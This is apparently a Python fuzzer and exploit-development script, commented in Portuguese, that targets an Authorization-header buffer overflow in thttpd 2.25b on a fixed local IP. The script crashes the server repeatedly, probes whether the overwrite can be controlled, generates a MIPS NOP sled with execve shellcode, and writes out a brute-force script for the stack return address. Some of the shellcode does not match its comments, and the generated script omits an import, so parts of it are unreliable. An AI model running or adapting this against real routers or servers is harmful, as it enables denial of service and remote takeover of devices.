#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
thttpd 2.25b Auth Overflow Fuzzer & Exploit Dev
Target: 192.168.1.254:443

Objetivo: Mapear o crash exato no header Authorization e determinar
se é controlável para execução de shellcode MIPS.

Fluxo de trabalho:
  1. Binary search do limite exato (entre 4KB e 8KB)
  2. Cyclic pattern para identificar offset do overwrite
  3. Teste de controle com endereço fixo conhecido
  4. Geração de payload com shellcode MIPS
"""

import socket
import ssl
import struct
import sys
import string
import time

TARGET = "192.168.1.254"
PORT = 443
TIMEOUT = 15

# MIPS nop sled (addiu $a0, $a0, 1) - harmless instruction
MIPS_NOP = b"\x24\x84\x00\x01"

# MIPS32 BE reverse shell shellcode (placeholder - needs customization)
# This is a standard MIPS execve("/bin/sh") shellcode
MIPS_EXECVE_SH = bytes.fromhex(
    "2404fffd"  # li $a0, -3
    "2405fffd"  # li $a1, -3
    "2406fffd"  # li $a2, -3
    "24020fa1"  # li $v0, 4001 (exit)
    "0000000c"  # syscall
)


def send_raw_https(request_bytes):
    """Envia bytes raw via HTTPS e retorna (status, body_bytes) ou (-1, error)"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=TIMEOUT)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)
        ssock.sendall(request_bytes)

        response = b""
        ssock.settimeout(5.0)
        try:
            while True:
                chunk = ssock.recv(8192)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        ssock.close()

        # Parse status
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            header_end = response.find(b"\n\n")

        if header_end == -1:
            return 0, response  # Partial response

        headers = response[:header_end].decode('latin-1', errors='replace')
        body = response[header_end:]

        status = 0
        for line in headers.split("\r\n"):
            if line.startswith("HTTP/"):
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        status = int(parts[1])
                    except:
                        pass
                break

        return status, body

    except ConnectionRefusedError:
        return -2, b"Connection refused"
    except socket.timeout:
        return -1, b"Timeout"
    except Exception as e:
        return -1, str(e).encode()


def build_auth_request(auth_b64_size):
    """Constrói request com Authorization: Basic de tamanho específico"""
    # Gerar payload base64 válido de tamanho exato
    raw_size = (auth_b64_size // 4) * 3  # aproximação
    raw = b"A" * raw_size
    b64 = raw.hex().upper()  # Not valid base64 but thttpd just passes it to b64_decode
    # Actually let's use proper base64
    import base64
    raw = b"A" * ((auth_b64_size * 3) // 4)
    b64 = base64.b64encode(raw).decode()
    # Pad or trim to exact size
    while len(b64) < auth_b64_size:
        b64 += "A"
    b64 = b64[:auth_b64_size]

    request = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Authorization: Basic " + b64.encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    return request


def build_auth_request_custom(user_bytes, pass_bytes=b"x"):
    """Constrói request com user/pass específicos (para cyclic pattern)"""
    import base64
    combined = user_bytes + b":" + pass_bytes
    b64 = base64.b64encode(combined).decode()

    request = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Authorization: Basic " + b64.encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    return request


def test_size(size):
    """Testa um tamanho específico de auth header. Retorna (status, is_crash)"""
    req = build_auth_request(size)
    status, body = send_raw_https(req)
    is_crash = status == -1 or status == -2 or status == 0
    return status, is_crash


def phase1_find_threshold():
    """Fase 1: Binary search para encontrar o limite exato do crash"""
    print("=" * 70)
    print("  FASE 1: Binary Search do Limite de Crash")
    print("=" * 70)

    low = 4096   # 4KB - sabemos que funciona
    high = 8192  # 8KB - sabemos que crasha

    print(f"\n[*] Buscando entre {low} e {high} bytes...")

    best_working = low
    best_crashing = high

    # First verify our assumptions
    print(f"\n  Testando {low} bytes...", end=" ")
    status, crash = test_size(low)
    print(f"Status={status}, Crash={'SIM' if crash else 'NAO'}")

    print(f"  Testando {high} bytes...", end=" ")
    status, crash = test_size(high)
    print(f"Status={status}, Crash={'SIM' if crash else 'NAO'}")

    if not crash:
        print("[!] 8KB não crashou! Aumentando limite superior...")
        high = 16384
        print(f"  Testando {high} bytes...", end=" ")
        status, crash = test_size(high)
        print(f"Status={status}, Crash={'SIM' if crash else 'NAO'}")

    # Binary search
    while high - low > 64:
        mid = (low + high) // 2
        print(f"  Testando {mid} bytes...", end=" ", flush=True)
        status, crash = test_size(mid)
        print(f"Status={status}, Crash={'SIM' if crash else 'NAO'}")

        if crash:
            high = mid
            best_crashing = mid
        else:
            low = mid
            best_working = mid

        time.sleep(0.3)

    print(f"\n[+] RESULTADO FASE 1:")
    print(f"    Último tamanho FUNCIONANDO: {best_working} bytes")
    print(f"    Primeiro tamanho CRASHANDO: {best_crashing} bytes")
    print(f"    Diferença: {best_crashing - best_working} bytes")

    return best_working, best_crashing


def generate_cyclic_pattern(length):
    """Gera pattern cíclico para identificar offset"""
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
    pattern = ""
    for i in range(length):
        pattern += charset[i % len(charset)]
    return pattern.encode()


def pattern_search(pattern, search_buf):
    """Procura o pattern no buffer de busca"""
    try:
        idx = search_buf.index(pattern)
        return idx
    except ValueError:
        return -1


def phase2_cyclic_pattern(threshold):
    """Fase 2: Enviar cyclic pattern para identificar offset exato"""
    print("\n" + "=" * 70)
    print("  FASE 2: Cyclic Pattern para Identificar Offset")
    print("=" * 70)

    # Tamanho do pattern: threshold + 1024 bytes de margem
    pattern_size = threshold + 1024
    print(f"\n[*] Gerando cyclic pattern de {pattern_size} bytes...")

    pattern = generate_cyclic_pattern(pattern_size)

    # Dividir em user:pass para que o b64_decode processe
    # O user será o pattern, pass é curto
    user = pattern
    pass_ = b"X"

    print(f"[*] Enviando pattern (user={len(user)} bytes)...")
    req = build_auth_request_custom(user, pass_)
    status, body = send_raw_https(req)

    print(f"    Status: {status}")
    if status == -1:
        print("    → CRASH! Conexão dropada.")
        print("    → O servidor provavelmente reiniciou.")
        print("    → Aguardando 5s para servidor recuperar...")
        time.sleep(5)
    elif status == 401:
        print("    → 401 Unauthorized (não crashou)")
        print("    → O threshold pode estar errado ou o crash não é reproduzível")
    else:
        print(f"    → Resposta inesperada: {status}")

    # Nota: Sem acesso ao debugger do alvo, não podemos verificar o $ra
    # diretamente. Mas podemos inferir pelo comportamento.
    print("\n[!] NOTA: Sem acesso ao debugger remoto, o offset exato do $ra")
    print("    não pode ser determinado automaticamente. O crash confirmado")
    print("    indica que ALGO está sendo sobrescrito.")

    return status == -1


def phase3_control_test(threshold):
    """Fase 3: Testar se o crash é controlável com endereço fixo"""
    print("\n" + "=" * 70)
    print("  FASE 3: Teste de Controle (Overwrite Verification)")
    print("=" * 70)

    # Estratégia: Enviar um payload com:
    # - Nopsled de MIPS NOPs
    # - Endereço de retorno conhecido (0x41414141 = "AAAA" em big-endian)
    # - Se o servidor demorar mais para crashar ou comportamento mudar,
    #   indica que o endereço está sendo usado

    print("\n[*] Teste 3a: Enviar 'AAAA' como potential $ra overwrite...")

    # User = padding + "AAAA" + padding
    # Se "AAAA" sobrescreve o $ra, o crash será em 0x41414141 (endereço inválido)
    # vs crash em outro lugar (NULL deref, etc.)

    # O tamanho do user precisa ser tal que o b64_decode produza o padding + AAAA
    # Base64: "AAAA" decodifica para 3 bytes: 0x00, 0x00, 0x00
    # Queremos o $ra = 0x41414141
    # Em base64: 0x41414141 em BE = "QUFBQQ=="

    import base64

    # Criar payload onde o b64_decode produzirá o endereço desejado no buffer
    # O b64_decode escreve no authinfo[500] até o limite
    # Precisamos saber SE o buffer estoura e ONDE o $ra fica

    # Como não sabemos o offset exato, vamos usar uma abordagem diferente:
    # Enviar um payload MUITO GRANDE (16KB) com um padrão específico
    # e verificar se o servidor fica DOWN (não responde mais) ou se recupera

    print("[*] Enviando payload de 16KB com padrão de controle...")

    # Padrão: repetição de um bloco identificável
    block = b"\x41\x42\x43\x44" * 100  # "ABCD" repeated
    big_payload = block * 40  # ~16KB

    req = build_auth_request_custom(big_payload, b"X")
    status, body = send_raw_https(req)

    print(f"    Status: {status}")

    # Verificar se o servidor ainda responde
    print("[*] Verificando se servidor ainda está vivo...")
    time.sleep(3)

    req_simple = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    status2, body2 = send_raw_https(req_simple)

    if status2 == -1 or status2 == -2:
        print("    → SERVIDOR MORTO! Não responde a requests normais.")
        print("    → Isso indica crash SEVERO (possivelmente overwrite de")
        print("      function pointer global ou corrompimento de heap critico)")
    else:
        print(f"    → Servidor vivo! Status={status2}")
        print("    → O crash é recuperável (watchdog reiniciou o processo)")

    return status2 == -1 or status2 == -2


def phase4_shellcode_payload():
    """Fase 4: Gerar payload com shellcode MIPS real"""
    print("\n" + "=" * 70)
    print("  FASE 4: Shellcode MIPS Payload Generator")
    print("=" * 70)

    print("""
[!] ATENÇÃO: Esta fase requer informações adicionais do alvo:

    1. Endereço exato do buffer na stack (ou endereço de jmp/call)
    2. Offset exato do $ra no stack frame
    3. Shellcode MIPS funcional para o ambiente específico

    Sem acesso ao debugger (gdb-multiarch + qemu-mips), o offset
    do $ra não pode ser determinado com precisão.

    Estratégia recomendada:
    a) Usar NOP sled grande (0x1000+ bytes) + shellcode
    b) Sobrescrever $ra com endereço no meio do NOP sled
    c) Como não há ASLR, o endereço da stack é fixo por execução

    Endereços típicos de stack em firmware MIPS (uClibc):
    - Geralmente em 0x7fffxxxx ou 0x7fxxxxxx
    - Depende do tamanho do stack alocado no startup

    Para descobrir o endereço exato:
    - Leak via LFI (se possível): /proc/self/maps
    - Ou brute-force o endereço da stack
""")

    # Gerar payload genérico
    print("[*] Gerando payload genérico MIPS BE...")

    # Shellcode: execve("/bin/sh", ["/bin/sh", NULL], NULL)
    # MIPS32 Big Endian
    shellcode = bytes.fromhex(
        # execve("/bin/sh", ["/bin/sh", 0], [0])
        "3c1c2f2f"  # lui $gp, 0x2f2f  ; "//"
        "279c6269"  # addiu $gp, $gp, 0x6269  ; "bi"
        "3c08fffd"  # lui $t0, 0xfffd
        "3508fffd"  # ori $t0, $t0, 0xfffd
        "3c09fffd"  # lui $t1, 0xfffd
        "3529fffd"  # ori $t1, $t1, 0xfffd
        "3c0afffd"  # lui $t2, 0xfffd
        "354afffd"  # ori $t2, $t2, 0xfffd
        "24020fab"  # li $v0, 4011  # sys_execve
        "0000000c"  # syscall
    )

    # NOP sled
    nopsled = MIPS_NOP * 500

    # Endereço de retorno placeholder (precisa ser ajustado)
    # Em MIPS BE: 0x7fff8000 = \x7f\xff\x80\x00
    ret_addr = b"\x7f\xff\x80\x00"

    payload = nopsled + shellcode

    print(f"    NOP sled: {len(nopsled)} bytes")
    print(f"    Shellcode: {len(shellcode)} bytes")
    print(f"    Total: {len(payload)} bytes")
    print(f"    Return address placeholder: {ret_addr.hex()}")

    # Salvar payload em arquivo
    with open('/tmp/mips_payload.bin', 'wb') as f:
        f.write(payload)
    print(f"\n[+] Payload salvo em: /tmp/mips_payload.bin")

    # Gerar script de brute-force de endereço
    brute_script = """#!/usr/bin/env python3
# Brute-force do endereço de retorno
# Testa endereços da stack em incrementos de 0x100

import socket, ssl, sys

TARGET = "192.168.1.254"
PORT = 443

# Range típico de stack em MIPS Linux
START = 0x7fff7000
END = 0x7fffa000
STEP = 0x100

def try_addr(addr):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    # Payload: ret_addr * 100 (para sobrescrever $ra)
    payload = struct.pack(">I", addr) * 100

    import base64
    b64 = base64.b64encode(payload).decode()

    req = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Authorization: Basic " + b64.encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=5)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)
        ssock.sendall(req)
        ssock.close()
        return True
    except:
        return False

import struct
for addr in range(START, END, STEP):
    print(f"Testing 0x{addr:08x}...")
    if try_addr(addr):
        print(f"  → Server responded (no crash)")
    else:
        print(f"  → CRASH or timeout!")
        print(f"  → Potential hit at 0x{addr:08x}")
        break
    time.sleep(0.5)
"""

    with open('/tmp/brute_retaddr.py', 'w') as f:
        f.write(brute_script)
    print(f"[+] Brute-force script salvo em: /tmp/brute_retaddr.py")


def main():
    print("=" * 70)
    print("  thttpd 2.25b Auth Overflow — Fuzzer & Exploit Dev")
    print(f"  Target: {TARGET}:{PORT}")
    print("=" * 70)

    # Verificar conectividade
    print("\n[*] Verificando conectividade...")
    req = (
        b"GET / HTTP/1.0\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
    )
    status, body = send_raw_https(req)
    if status < 0:
        print(f"[FATAL] Não foi possível conectar: {body}")
        sys.exit(1)
    print(f"[+] Conectado! Status inicial: {status}")

    # Fase 1: Encontrar threshold
    working, crashing = phase1_find_threshold()

    # Fase 2: Cyclic pattern
    crashed = phase2_cyclic_pattern(working)

    # Fase 3: Controle
    server_died = phase3_control_test(working)

    # Fase 4: Shellcode
    phase4_shellcode_payload()

    # Resumo
    print("\n" + "=" * 70)
    print("  RESUMO FINAL")
    print("=" * 70)
    print(f"  Threshold de crash: ~{crashing} bytes")
    print(f"  Crash reproduzível: {'SIM' if crashed else 'NAO'}")
    print(f"  Servidor morre permanentemente: {'SIM' if server_died else 'NAO'}")
    print()
    print("  Próximos passos:")
    print("  1. Se servidor morre: o crash é SEVERO. Pode ser heap corruption")
    print("     ou overwrite de pointer global. Requer análise com gdb.")
    print("  2. Se servidor recupera: watchdog reinicia. Pode ser stack overflow")
    print("     no processo filho (fork para request). Brute-force do $ra.")
    print("  3. Executar: python3 /tmp/brute_retaddr.py")
    print("=" * 70)


if __name__ == "__main__":
    main()
